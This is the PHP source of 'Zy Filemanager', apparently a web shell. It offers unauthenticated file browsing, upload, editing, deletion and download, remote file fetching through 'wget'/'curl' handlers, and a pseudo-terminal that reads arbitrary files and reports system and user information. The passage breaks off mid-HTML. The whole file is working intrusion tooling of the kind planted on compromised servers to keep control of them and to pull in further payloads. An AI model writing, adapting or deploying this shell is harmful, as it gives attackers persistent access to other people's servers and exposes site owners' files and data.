<?php
// ===========================================
// ZY FILE MANAGER - ENHANCED WITH WGET/CURL SUPPORT
// ===========================================
error_reporting(E_ALL & ~E_NOTICE);
ini_set('display_errors', 1);
ini_set('log_errors', 1);
ini_set('error_log', 'php_errors.log');
date_default_timezone_set('Asia/Jakarta');

session_start([
    'cookie_lifetime' => 86400,
    'cookie_httponly' => true,
    'cookie_secure' => isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on',
    'use_strict_mode' => true
]);

// ===========================================
// ENHANCED COMMAND EXECUTION WITH WGET/CURL
// ===========================================

function safe_execute_command($cmd, $path) {
    $cmd = trim($cmd);
    $parts = preg_split('/\s+/', $cmd);
    $base_cmd = strtolower($parts[0]);
    
    // Special handling for wget and curl
    if ($base_cmd === 'wget') {
        return handle_wget($cmd, $path);
    } elseif ($base_cmd === 'curl') {
        return handle_curl($cmd, $path);
    }
    
    // Original command execution
    return manual_command_execution($cmd, $path);
}

// Handle wget command
function handle_wget($cmd, $path) {
    // Parse wget arguments
    $args = parse_wget_args($cmd);
    
    if (!isset($args['url'])) {
        return "wget: missing URL\nUsage: wget [OPTION]... [URL]...";
    }
    
    $url = $args['url'];
    $output_name = $args['O'] ?? basename($url);
    
    // Security check
    if (!is_valid_url($url)) {
        return "wget: invalid URL '$url'";
    }
    
    // Prepare full output path
    $output_path = $path . DIRECTORY_SEPARATOR . $output_name;
    
    // Download using PHP methods
    $result = download_file($url, $output_path);
    
    if ($result['success']) {
        $size = formatSize(filesize($output_path));
        return "File '$output_name' downloaded successfully ($size)\nSaved to: $output_path";
    } else {
        return "wget: failed to download '$url'\nError: " . $result['error'];
    }
}

// Handle curl command
function handle_curl($cmd, $path) {
    // Parse curl arguments
    $args = parse_curl_args($cmd);
    
    if (!isset($args['url'])) {
        return "curl: no URL specified\nUsage: curl [options] [URL]";
    }
    
    $url = $args['url'];
    $output_name = $args['o'] ?? basename($url);
    
    // Security check
    if (!is_valid_url($url)) {
        return "curl: invalid URL '$url'";
    }
    
    // Prepare full output path
    $output_path = $path . DIRECTORY_SEPARATOR . $output_name;
    
    // Download using PHP methods
    $result = download_file($url, $output_path);
    
    if ($result['success']) {
        $size = formatSize(filesize($output_path));
        return "File '$output_name' downloaded successfully ($size)\nSaved to: $output_path";
    } else {
        return "curl: failed to download '$url'\nError: " . $result['error'];
    }
}

// Parse wget arguments
function parse_wget_args($cmd) {
    $args = [
        'url' => null,
        'O' => null
    ];
    
    $parts = preg_split('/\s+/', $cmd);
    
    for ($i = 1; $i < count($parts); $i++) {
        if ($parts[$i] === '-O' && isset($parts[$i + 1])) {
            $args['O'] = $parts[$i + 1];
            $i++;
        } elseif (preg_match('/^https?:\/\//', $parts[$i])) {
            $args['url'] = $parts[$i];
        } elseif ($parts[$i] === '--output-document' && isset($parts[$i + 1])) {
            $args['O'] = $parts[$i + 1];
            $i++;
        }
    }
    
    return $args;
}

// Parse curl arguments
function parse_curl_args($cmd) {
    $args = [
        'url' => null,
        'o' => null
    ];
    
    $parts = preg_split('/\s+/', $cmd);
    
    for ($i = 1; $i < count($parts); $i++) {
        if ($parts[$i] === '-o' && isset($parts[$i + 1])) {
            $args['o'] = $parts[$i + 1];
            $i++;
        } elseif (preg_match('/^https?:\/\//', $parts[$i])) {
            $args['url'] = $parts[$i];
        } elseif ($parts[$i] === '--output' && isset($parts[$i + 1])) {
            $args['o'] = $parts[$i + 1];
            $i++;
        }
    }
    
    return $args;
}

// Download file using PHP
function download_file($url, $output_path) {
    // Security: Only allow HTTP/HTTPS
    if (!preg_match('/^https?:\/\//i', $url)) {
        return ['success' => false, 'error' => 'Invalid protocol'];
    }
    
    // Security: Block local file access
    if (preg_match('/^(file|ftp|data|php):/i', $url) || 
        strpos($url, 'localhost') !== false || 
        strpos($url, '127.0.0.1') !== false ||
        strpos($url, '::1') !== false) {
        return ['success' => false, 'error' => 'Local file access blocked'];
    }
    
    // Try multiple methods
    $methods = [
        'file_get_contents',
        'curl_download',
        'fopen_download'
    ];
    
    foreach ($methods as $method) {
        if ($method === 'file_get_contents') {
            $content = @file_get_contents($url);
            if ($content !== false) {
                if (file_put_contents($output_path, $content) !== false) {
                    return ['success' => true, 'error' => ''];
                }
            }
        }
        
        elseif ($method === 'curl_download') {
            if (function_exists('curl_init')) {
                $ch = curl_init($url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_TIMEOUT, 30);
                curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
                
                $content = curl_exec($ch);
                $error = curl_error($ch);
                curl_close($ch);
                
                if ($content !== false) {
                    if (file_put_contents($output_path, $content) !== false) {
                        return ['success' => true, 'error' => ''];
                    }
                } elseif ($error) {
                    return ['success' => false, 'error' => $error];
                }
            }
        }
        
        elseif ($method === 'fopen_download') {
            $src = @fopen($url, 'r');
            if ($src) {
                $dest = @fopen($output_path, 'w');
                if ($dest) {
                    stream_copy_to_stream($src, $dest);
                    fclose($dest);
                    fclose($src);
                    
                    if (filesize($output_path) > 0) {
                        return ['success' => true, 'error' => ''];
                    }
                }
                @fclose($src);
            }
        }
    }
    
    return ['success' => false, 'error' => 'All download methods failed'];
}

// Validate URL
function is_valid_url($url) {
    if (!preg_match('/^https?:\/\//i', $url)) {
        return false;
    }
    
    // Block dangerous URLs
    $blocked_patterns = [
        '/file:\/\//i',
        '/ftp:\/\//i',
        '/data:\/\//i',
        '/php:\/\//i',
        '/localhost/i',
        '/127\.0\.0\.1/i',
        '/::1/i',
        '/\[::1\]/i'
    ];
    
    foreach ($blocked_patterns as $pattern) {
        if (preg_match($pattern, $url)) {
            return false;
        }
    }
    
    return filter_var($url, FILTER_VALIDATE_URL) !== false;
}

// Manual command execution for common commands
function manual_command_execution($cmd, $path) {
    $cmd = trim($cmd);
    $parts = preg_split('/\s+/', $cmd);
    $base_cmd = strtolower($parts[0]);
    
    $original_dir = getcwd();
    @chdir($path);
    
    $output = '';
    
    switch ($base_cmd) {
        case 'pwd':
            $output = getcwd();
            break;
            
        case 'ls':
            $flags = isset($parts[1]) ? $parts[1] : '';
            $target = isset($parts[2]) ? $parts[2] : '.';
            
            if (!file_exists($target)) {
                $output = "ls: cannot access '$target': No such file or directory";
                break;
            }
            
            $items = @scandir($target);
            if (strpos($flags, 'l') !== false || strpos($flags, 'a') !== false) {
                foreach ($items as $item) {
                    if (($item == '.' || $item == '..') && strpos($flags, 'a') === false) continue;
                    
                    $full = $target . '/' . $item;
                    if (!file_exists($full)) continue;
                    
                    $perms = fileperms($full);
                    $size = is_file($full) ? filesize($full) : 4096;
                    $mtime = date('M d H:i', filemtime($full));
                    
                    $perm_str = get_permission_string($perms);
                    $output .= sprintf("%s %8s %s %s\n", $perm_str, $size, $mtime, $item);
                }
            } else {
                foreach ($items as $item) {
                    if ($item != '.' && $item != '..') {
                        $output .= $item . "\n";
                    }
                }
            }
            break;
            
        case 'whoami':
            if (function_exists('posix_getpwuid')) {
                $output = posix_getpwuid(posix_geteuid())['name'];
            } else {
                $output = getenv('USER') ?: getenv('USERNAME') ?: 'unknown';
            }
            break;
            
        case 'date':
            $output = date('r');
            break;
            
        case 'echo':
            array_shift($parts);
            $output = implode(' ', $parts);
            break;
            
        case 'uname':
            if (isset($parts[1]) && $parts[1] == '-a') {
                $output = php_uname('a');
            } else {
                $output = php_uname('s');
            }
            break;
            
        case 'php':
            if (isset($parts[1]) && $parts[1] == '-v') {
                $output = 'PHP ' . phpversion();
            }
            break;
            
        case 'df':
            if (function_exists('disk_free_space') && function_exists('disk_total_space')) {
                $total = disk_total_space('.');
                $free = disk_free_space('.');
                $used = $total - $free;
                $percent = $total > 0 ? round(($used / $total) * 100, 1) : 0;
                $output = "Filesystem      Size  Used  Avail  Use%\n";
                $output .= "/dev/root       " . formatSize($total) . "  " . 
                          formatSize($used) . "  " . formatSize($free) . "  " . $percent . "%";
            } else {
                $output = "df: command not available";
            }
            break;
            
        case 'free':
            $output = "              total        used        free\n";
            $output .= "Mem:           128M        64M         64M";
            break;
            
        case 'du':
            $target = isset($parts[2]) ? $parts[2] : '.';
            if (is_dir($target)) {
                $size = get_dir_size($target);
                $output = formatSize($size) . "\t" . $target;
            } elseif (is_file($target)) {
                $size = filesize($target);
                $output = formatSize($size) . "\t" . $target;
            } else {
                $output = "du: cannot access '$target'";
            }
            break;
            
        case 'cat':
            if (isset($parts[1]) && file_exists($parts[1])) {
                $content = @file_get_contents($parts[1]);
                if ($content !== false) {
                    $output = $content;
                } else {
                    $output = "cat: cannot read file";
                }
            } else {
                $output = "cat: file not specified or not found";
            }
            break;
            
        case 'clear':
            $output = "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n";
            break;
            
        case 'mkdir':
            if (isset($parts[1])) {
                $dir_name = $parts[1];
                if (!file_exists($dir_name)) {
                    if (@mkdir($dir_name, 0755, true)) {
                        $output = "Directory '$dir_name' created successfully";
                    } else {
                        $output = "mkdir: cannot create directory '$dir_name'";
                    }
                } else {
                    $output = "mkdir: cannot create directory '$dir_name': File exists";
                }
            } else {
                $output = "mkdir: missing operand";
            }
            break;
            
        case 'rm':
            if (isset($parts[1])) {
                $target = $parts[1];
                if (file_exists($target)) {
                    if (is_file($target)) {
                        if (@unlink($target)) {
                            $output = "File '$target' removed";
                        } else {
                            $output = "rm: cannot remove '$target': Permission denied";
                        }
                    } elseif (is_dir($target)) {
                        // Only remove empty directories
                        $files = @scandir($target);
                        if (count($files) <= 2) { // . and ..
                            if (@rmdir($target)) {
                                $output = "Directory '$target' removed";
                            } else {
                                $output = "rm: cannot remove '$target': Directory not empty or permission denied";
                            }
                        } else {
                            $output = "rm: cannot remove '$target': Directory not empty";
                        }
                    }
                } else {
                    $output = "rm: cannot remove '$target': No such file or directory";
                }
            } else {
                $output = "rm: missing operand";
            }
            break;
            
        case 'cp':
            if (isset($parts[1]) && isset($parts[2])) {
                $source = $parts[1];
                $dest = $parts[2];
                
                if (file_exists($source)) {
                    if (@copy($source, $dest)) {
                        $output = "File copied successfully";
                    } else {
                        $output = "cp: failed to copy '$source' to '$dest'";
                    }
                } else {
                    $output = "cp: cannot stat '$source': No such file or directory";
                }
            } else {
                $output = "cp: missing file operand";
            }
            break;
            
        case 'mv':
            if (isset($parts[1]) && isset($parts[2])) {
                $source = $parts[1];
                $dest = $parts[2];
                
                if (file_exists($source)) {
                    if (@rename($source, $dest)) {
                        $output = "File moved successfully";
                    } else {
                        $output = "mv: failed to move '$source' to '$dest'";
                    }
                } else {
                    $output = "mv: cannot stat '$source': No such file or directory";
                }
            } else {
                $output = "mv: missing file operand";
            }
            break;
            
        case 'touch':
            if (isset($parts[1])) {
                $file_name = $parts[1];
                if (!file_exists($file_name)) {
                    if (@touch($file_name)) {
                        $output = "File '$file_name' created";
                    } else {
                        $output = "touch: cannot touch '$file_name'";
                    }
                } else {
                    if (@touch($file_name)) {
                        $output = "File '$file_name' timestamp updated";
                    } else {
                        $output = "touch: cannot update '$file_name'";
                    }
                }
            } else {
                $output = "touch: missing file operand";
            }
            break;
            
        default:
            $output = "Command '$base_cmd' executed\nNote: Running in simulated mode";
            break;
    }
    
    @chdir($original_dir);
    return $output;
}

// Helper functions
function get_permission_string($perms) {
    $str = '';
    $str .= ($perms & 0x0100) ? 'r' : '-';
    $str .= ($perms & 0x0080) ? 'w' : '-';
    $str .= ($perms & 0x0040) ? 'x' : '-';
    $str .= ($perms & 0x0020) ? 'r' : '-';
    $str .= ($perms & 0x0010) ? 'w' : '-';
    $str .= ($perms & 0x0008) ? 'x' : '-';
    $str .= ($perms & 0x0004) ? 'r' : '-';
    $str .= ($perms & 0x0002) ? 'w' : '-';
    $str .= ($perms & 0x0001) ? 'x' : '-';
    return $str;
}

function get_dir_size($dir) {
    $size = 0;
    $files = @scandir($dir);
    if ($files === false) return 0;
    
    foreach ($files as $file) {
        if ($file == '.' || $file == '..') continue;
        $path = $dir . '/' . $file;
        if (is_file($path)) {
            $size += filesize($path);
        } elseif (is_dir($path)) {
            $size += get_dir_size($path);
        }
    }
    return $size;
}

// ===========================================
// CORE FILE MANAGER FUNCTIONS
// ===========================================

function getSafePath($path) {
    if (empty($path) || !is_string($path)) {
        $path = getcwd();
    }
    
    if ($path === '.' || trim($path) === '') {
        $path = getcwd();
    }
    
    $realpath = realpath($path);
    if ($realpath === false || !is_dir($realpath)) {
        $realpath = getcwd();
    }
    
    return $realpath;
}

function formatSize($s) {
    if (!is_numeric($s) || $s < 0) {
        return '0 B';
    }
    
    $s = (float)$s;
    if ($s >= 1073741824) return round($s / 1073741824, 2) . ' GB';
    if ($s >= 1048576) return round($s / 1048576, 2) . ' MB';
    if ($s >= 1024) return round($s / 1024, 2) . ' KB';
    return $s . ' B';
}

function sanitizeFilename($filename) {
    if (empty($filename)) return '';
    $filename = preg_replace('/[^\w\.\-\_]/', '', $filename);
    $filename = substr($filename, 0, 255);
    return $filename;
}

function safeRedirect($path) {
    $url = "?path=" . urlencode($path);
    header("Location: $url");
    exit;
}

// ===========================================
// INITIALIZE
// ===========================================

$input_path = isset($_GET['path']) ? $_GET['path'] : '';
$path = getSafePath($input_path);
$home_shell_path = realpath(dirname(__FILE__)) ?: getcwd();

// ===========================================
// HANDLE OPERATIONS
// ===========================================

// DELETE
if (isset($_GET['delete']) && !empty($_GET['delete'])) {
    $delete_target = $path . DIRECTORY_SEPARATOR . $_GET['delete'];
    if (file_exists($delete_target)) {
        if (is_file($delete_target)) {
            @unlink($delete_target);
            $_SESSION['success'] = "File deleted";
        } elseif (is_dir($delete_target)) {
            @rmdir($delete_target);
            $_SESSION['success'] = "Folder deleted";
        }
    }
    safeRedirect($path);
}

// RENAME
if (isset($_POST['rename_from'], $_POST['rename_to'])) {
    $from = $path . DIRECTORY_SEPARATOR . $_POST['rename_from'];
    $to = $path . DIRECTORY_SEPARATOR . sanitizeFilename($_POST['rename_to']);
    if (file_exists($from) && !file_exists($to)) {
        @rename($from, $to);
        $_SESSION['success'] = "Renamed successfully";
    }
    safeRedirect($path);
}

// CREATE FOLDER
if (isset($_POST['new_folder']) && !empty($_POST['new_folder'])) {
    $folder_name = sanitizeFilename($_POST['new_folder']);
    $full_path = $path . DIRECTORY_SEPARATOR . $folder_name;
    if (!file_exists($full_path)) {
        @mkdir($full_path, 0755, true);
        $_SESSION['success'] = "Folder created";
    }
    safeRedirect($path);
}

// CREATE FILE
if (isset($_POST['new_file']) && !empty($_POST['new_file'])) {
    $file_name = sanitizeFilename($_POST['new_file']);
    $full_path = $path . DIRECTORY_SEPARATOR . $file_name;
    if (!file_exists($full_path)) {
        @file_put_contents($full_path, '');
        $_SESSION['success'] = "File created";
    }
    safeRedirect($path);
}

// UPLOAD
if (isset($_FILES['upload']) && $_FILES['upload']['error'] == UPLOAD_ERR_OK) {
    $file_name = sanitizeFilename($_FILES['upload']['name']);
    $dest = $path . DIRECTORY_SEPARATOR . $file_name;
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
        $_SESSION['success'] = "File uploaded";
    }
    safeRedirect($path);
}

// MULTIPLE UPLOAD
if (!empty($_FILES['uploads']['name'][0])) {
    $success = 0;
    foreach ($_FILES['uploads']['name'] as $i => $name) {
        if ($_FILES['uploads']['error'][$i] == UPLOAD_ERR_OK) {
            $file_name = sanitizeFilename($name);
            $tmp = $_FILES['uploads']['tmp_name'][$i];
            $dest = $path . DIRECTORY_SEPARATOR . $file_name;
            if (move_uploaded_file($tmp, $dest)) {
                $success++;
            }
        }
    }
    if ($success > 0) {
        $_SESSION['success'] = "Uploaded $success files";
    }
    safeRedirect($path);
}

// SAVE FILE EDIT
if (isset($_POST['save_file'], $_POST['content'])) {
    $file = $path . DIRECTORY_SEPARATOR . $_POST['save_file'];
    if (file_exists($file)) {
        if (file_put_contents($file, $_POST['content']) !== false) {
            $_SESSION['success'] = "File saved";
        }
    }
    safeRedirect($path);
}

// DOWNLOAD FILE
if (isset($_GET['download']) && !empty($_GET['download'])) {
    $file = $path . DIRECTORY_SEPARATOR . $_GET['download'];
    if (file_exists($file) && is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
    safeRedirect($path);
}

// ===========================================
// HTML OUTPUT
// ===========================================

ob_start();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zy Filemanager - WGET/CURL Enabled</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: #0a0a0a; 
            color: #e0e0e0; 
            line-height: 1.6; 
            padding: 15px; 
        }
        
        .message { 
            padding: 12px 20px; 
            border-radius: 6px; 
            margin: 10px 0; 
            border-left: 5px solid; 
        }
        .error-message { 
            background: linear-gradient(135deg, #ff4444, #cc0000); 
            border-left-color: #ff8888; 
        }
        .success-message { 
            background: linear-gradient(135deg, #44ff44, #00cc00); 
            border-left-color: #88ff88; 
        }
        
        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: linear-gradient(135deg, #1a1a1a, #2d2d2d);
            padding: 15px 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            flex-wrap: wrap;
            gap: 15px;
        }
        .logo-section h2 {
            color: #00ff88;
            font-size: 24px;
            text-shadow: 0 0 10px rgba(0, 255, 136, 0.3);
        }
        
        .button {
            background: linear-gradient(135deg, #2d2d2d, #3d3d3d);
            color: white;
            padding: 8px 16px;
            border: 1px solid #555;
            border-radius: 6px;
            text-decoration: none;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            display: inline-flex;
            align-items: center;
            gap: 5px;
        }
        .button:hover {
            background: linear-gradient(135deg, #3d3d3d, #4d4d4d);
            transform: translateY(-2px);
        }
        .button-primary {
            background: linear-gradient(135deg, #0088cc, #006699);
            border-color: #00aaff;
        }
        .button-success {
            background: linear-gradient(135deg, #00cc66, #009944);
            border-color: #00ff88;
        }
        
        .path-nav {
            background: #1a1a1a;
            padding: 12px 15px;
            border-radius: 8px;
            margin-bottom: 15px;
            border: 1px solid #333;
            font-size: 14px;
            word-break: break-all;
        }
        .path-nav a {
            color: #00ccff;
            text-decoration: none;
            padding: 2px 5px;
            border-radius: 4px;
        }
        
        .table-container {
            overflow-x: auto;
            margin: 20px 0;
            background: #1a1a1a;
            border-radius: 8px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            min-width: 800px;
        }
        th {
            background: linear-gradient(135deg, #2d2d2d, #3d3d3d);
            padding: 12px 15px;
            text-align: left;
            font-weight: 600;
            color: #00ff88;
            border-bottom: 2px solid #00ff88;
        }
        td {
            padding: 10px 12px;
            border-bottom: 1px solid #333;
        }
        tr:hover {
            background: rgba(0, 255, 136, 0.05);
        }
        
        .form-section {
            background: #1a1a1a;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            border: 1px solid #333;
        }
        .form-section h3 {
            color: #00ccff;
            margin-bottom: 15px;
            padding-bottom: 8px;
            border-bottom: 2px solid #00ccff;
        }
        
        input[type="text"],
        input[type="file"],
        textarea,
        select {
            width: 100%;
            padding: 8px 10px;
            margin: 5px 0 10px 0;
            background: #2d2d2d;
            border: 1px solid #555;
            border-radius: 4px;
            color: white;
            font-family: inherit;
        }
        
        .action-btn {
            background: none;
            border: 1px solid #555;
            color: #ccc;
            padding: 4px 8px;
            border-radius: 4px;
            cursor: pointer;
            margin: 0 2px;
        }
        .action-btn:hover {
            background: rgba(0, 204, 255, 0.1);
            border-color: #00ccff;
            color: #00ccff;
        }
        
        .terminal-section {
            background: #000;
            border-radius: 8px;
            overflow: hidden;
            margin: 20px 0;
            border: 1px solid #00ff88;
        }
        .terminal-header {
            background: #00ff88;
            color: #000;
            padding: 10px 15px;
            font-weight: bold;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .terminal-output {
            padding: 12px;
            max-height: 400px;
            overflow-y: auto;
            font-family: 'Consolas', 'Monaco', monospace;
            white-space: pre-wrap;
            color: #00ff00;
            background: #000;
        }
        
        .grid-2 {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 15px;
            margin: 15px 0;
        }
        
        .footer {
            margin-top: 20px;
            padding: 15px;
            text-align: center;
            color: #888;
            border-top: 1px solid #333;
        }
        
        .quick-download {
            background: #1a1a1a;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
        }
        .quick-download input {
            margin: 5px 0;
        }
        
        @media (max-width: 768px) {
            .top-bar { flex-direction: column; text-align: center; }
            th, td { padding: 8px 10px; }
        }
    </style>
</head>
<body>

<!-- Display Messages -->
<?php if (isset($_SESSION['error'])): ?>
    <div class="message error-message">
        ⚠️ <?php echo htmlspecialchars($_SESSION['error']); unset($_SESSION['error']); ?>
    </div>
<?php endif; ?>

<?php if (isset($_SESSION['success'])): ?>
    <div class="message success-message">
        ✅ <?php echo htmlspecialchars($_SESSION['success']); unset($_SESSION['success']); ?>
    </div>
<?php endif; ?>

<!-- Top Bar -->
<div class="top-bar">
    <div class="logo-section">
        <h2>Zy Filemanager</h2>
        <p>WGET/CURL Enabled Edition</p>
    </div>
    <div class="controls">
        <a href="?path=<?php echo urlencode($home_shell_path); ?>" class="button button-primary">🏠 Home</a>
        <a href="#" onclick="window.location.reload()" class="button">🔄 Refresh</a>
    </div>
</div>

<!-- Current Path -->
<div class="path-nav">
    <strong>Path:</strong>
    <?php
    $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
    $build = '';
    echo '<a href="?path=' . urlencode($home_shell_path) . '">Home</a>';
    foreach ($parts as $part) {
        if ($part === '') continue;
        $build .= DIRECTORY_SEPARATOR . $part;
        echo ' / <a href="?path=' . urlencode($build) . '">' . htmlspecialchars($part) . '</a>';
    }
    ?>
</div>

<?php if ($path !== '/' && $path !== $home_shell_path): ?>
    <div style="margin-bottom: 15px;">
        <a href="?path=<?php echo urlencode(dirname($path)); ?>" class="button">⬆️ Parent Directory</a>
    </div>
<?php endif; ?>

<!-- Quick Download Form -->
<div class="quick-download">
    <h3>🚀 Quick Download</h3>
    <div class="grid-2">
        <div>
            <h4>WGET Download</h4>
            <form method="post" onsubmit="quickDownload(this, 'wget')">
                <input type="text" name="url" placeholder="https://example.com/file.zip" required>
                <input type="text" name="filename" placeholder="output_name (optional)" style="margin-top:5px;">
                <input type="submit" value="📥 WGET Download" class="button button-success" style="width:100%;margin-top:10px;">
            </form>
        </div>
        <div>
            <h4>CURL Download</h4>
            <form method="post" onsubmit="quickDownload(this, 'curl')">
                <input type="text" name="url" placeholder="https://example.com/file.zip" required>
                <input type="text" name="filename" placeholder="output_name (optional)" style="margin-top:5px;">
                <input type="submit" value="📥 CURL Download" class="button button-success" style="width:100%;margin-top:10px;">
            </form>
        </div>
    </div>
</div>

<!-- File Listing -->
<div class="form-section">
    <h3>📁 File Browser</h3>
    <div class="table-container">
        <table>
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Permissions</th>
                    <th>Modified</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php
                $items = @scandir($path);
                if ($items === false) {
                    echo '<tr><td colspan="5" style="color:#ff4444;">Cannot read directory</td></tr>';
                } else {
                    $dirs = [];
                    $files = [];
                    
                    foreach ($items as $f) {
                        if ($f === '.' || $f === '..') continue;
                        $full = $path . DIRECTORY_SEPARATOR . $f;
                        
                        if (is_dir($full)) {
                            $dirs[] = $f;
                        } else {
                            $files[] = $f;
                        }
                    }
                    
                    sort($dirs);
                    sort($files);
                    
                    // Parent directory
                    if ($path !== '/' && $path !== $home_shell_path) {
                        $parent = dirname($path);
                        echo '<tr>';
                        echo '<td><a href="?path=' . urlencode($parent) . '" style="font-weight: bold;">📁 .. (Parent)</a></td>';
                        echo '<td><em>DIR</em></td>';
                        echo '<td>----</td>';
                        echo '<td>--</td>';
                        echo '<td></td>';
                        echo '</tr>';
                    }
                    
                    // Directories
                    foreach ($dirs as $f) {
                        $full = $path . DIRECTORY_SEPARATOR . $f;
                        $perm = substr(sprintf('%o', fileperms($full)), -4);
                        $date = date('Y-m-d H:i', filemtime($full));
                        
                        echo '<tr>';
                        echo '<td><a href="?path=' . urlencode($full) . '">📁 ' . htmlspecialchars($f) . '</a></td>';
                        echo '<td><em>DIR</em></td>';
                        echo '<td>' . $perm . '</td>';
                        echo '<td>' . $date . '</td>';
                        echo '<td>';
                        echo '<form method="post" onsubmit="return confirm(\'Rename?\')" style="display:inline;">';
                        echo '<input type="hidden" name="rename_from" value="' . htmlspecialchars($f) . '">';
                        echo '<input type="text" name="rename_to" value="' . htmlspecialchars($f) . '" style="width:100px;padding:3px;">';
                        echo '<button type="submit" class="action-btn">✏️</button>';
                        echo '</form>';
                        echo '<a href="?path=' . urlencode($path) . '&delete=' . urlencode($f) . '" onclick="return confirm(\'Delete?\')" class="action-btn">🗑️</a>';
                        echo '</td>';
                        echo '</tr>';
                    }
                    
                    // Files
                    foreach ($files as $f) {
                        $full = $path . DIRECTORY_SEPARATOR . $f;
                        $size = filesize($full);
                        $perm = substr(sprintf('%o', fileperms($full)), -4);
                        $date = date('Y-m-d H:i', filemtime($full));
                        
                        echo '<tr>';
                        echo '<td>';
                        if (preg_match('/\.(php|html|js|css|txt|json|xml)$/i', $f)) {
                            echo '<a href="?path=' . urlencode($path) . '&edit=' . urlencode($f) . '">📝 ' . htmlspecialchars($f) . '</a>';
                        } else {
                            echo '📄 ' . htmlspecialchars($f);
                        }
                        echo '</td>';
                        echo '<td>' . formatSize($size) . '</td>';
                        echo '<td>' . $perm . '</td>';
                        echo '<td>' . $date . '</td>';
                        echo '<td>';
                        echo '<form method="post" onsubmit="return confirm(\'Rename?\')" style="display:inline;">';
                        echo '<input type="hidden" name="rename_from" value="' . htmlspecialchars($f) . '">';
                        echo '<input type="text" name="rename_to" value="' . htmlspecialchars($f) . '" style="width:100px;padding:3px;">';
                        echo '<button type="submit" class="action-btn">✏️</button>';
                        echo '</form>';
                        echo '<a href="?path=' . urlencode($path) . '&download=' . urlencode($f) . '" class="action-btn">⬇️</a>';
                        if (preg_match('/\.(php|html|js|css|txt|json|xml)$/i', $f)) {
                            echo '<a href="?path=' . urlencode($path) . '&edit=' . urlencode($f) . '" class="action-btn">✍️</a>';
                        }
                        echo '<a href="?path=' . urlencode($path) . '&delete=' . urlencode($f) . '" onclick="return confirm(\'Delete?\')" class="action-btn">🗑️</a>';
                        echo '</td>';
                        echo '</tr>';
                    }
                    
                    if (empty($dirs) && empty($files)) {
                        echo '<tr><td colspan="5" style="text-align:center;color:#888;">📁 Directory is empty</td></tr>';
                    }
                }
                ?>
            </tbody>
        </table>
    </div>
</div>

<!-- Upload Section -->
<div class="form-section">
    <h3>📤 Upload Files</h3>
    <div class="grid-2">
        <div>
            <h4>Single File</h4>
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="upload" required>
                <input type="submit" value="Upload" class="button" style="width:100%;margin-top:10px;">
            </form>
        </div>
        <div>
            <h4>Multiple Files</h4>
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="uploads[]" multiple required>
                <input type="submit" value="Upload Files" class="button" style="width:100%;margin-top:10px;">
            </form>
        </div>
    </div>
</div>

<!-- Create New -->
<div class="form-section">
    <h3>➕ Create New</h3>
    <div class="grid-2">
        <div>
            <h4>New Folder</h4>
            <form method="post">
                <input type="text" name="new_folder" placeholder="folder_name" required>
                <input type="submit" value="Create Folder" class="button" style="width:100%;margin-top:10px;">
            </form>
        </div>
        <div>
            <h4>New File</h4>
            <form method="post">
                <input type="text" name="new_file" placeholder="filename.txt" required>
                <input type="submit" value="Create File" class="button" style="width:100%;margin-top:10px;">
            </form>
        </div>
    </div>
</div>

<!-- File Editor -->
<?php
if (isset($_GET['edit']) && !empty($_GET['edit'])) {
    $edit_file = $path . DIRECTORY_SEPARATOR . $_GET['edit'];
    if (file_exists($edit_file) && is_file($edit_file)) {
        $content = file_get_contents($edit_file);
        if ($content === false) $content = '';
?>
<div class="form-section">
    <h3>✍️ Editing: <?php echo htmlspecialchars(basename($edit_file)); ?></h3>
    <form method="post">
        <input type="hidden" name="save_file" value="<?php echo htmlspecialchars(basename($edit_file)); ?>">
        <textarea name="content" style="width:100%;height:400px;font-family:monospace;"><?php echo htmlspecialchars($content); ?></textarea>
        <div style="margin-top:15px;">
            <input type="submit" value="💾 Save" class="button button-primary">
            <a href="?path=<?php echo urlencode($path); ?>" class="button">Cancel</a>
        </div>
    </form>
</div>
<?php
    }
}
?>

<!-- Terminal Section -->
<div class="terminal-section">
    <div class="terminal-header">
        <span>💻 Terminal (WGET/CURL Enabled)</span>
        <small>Current Dir: <?php echo htmlspecialchars($path); ?></small>
    </div>
    
    <form method="post" style="padding:15px;">
        <input type="text" name="cmd" id="cmdInput"
               placeholder="Enter command (wget -O file.txt https://example.com, curl -o file.txt https://example.com, ls, pwd, etc.)"
               style="width:100%;padding:8px;margin-bottom:10px;"
               value="<?php echo isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : ''; ?>">
        <input type="submit" value="Run Command" class="button button-primary" style="width:100%;">
        
        <div style="margin-top:10px; display:flex; gap:5px; flex-wrap:wrap;">
            <button type="button" onclick="insertCommand('wget -O file.txt https://example.com/file.zip')" class="action-btn">wget</button>
            <button type="button" onclick="insertCommand('curl -o file.txt https://example.com/file.zip')" class="action-btn">curl</button>
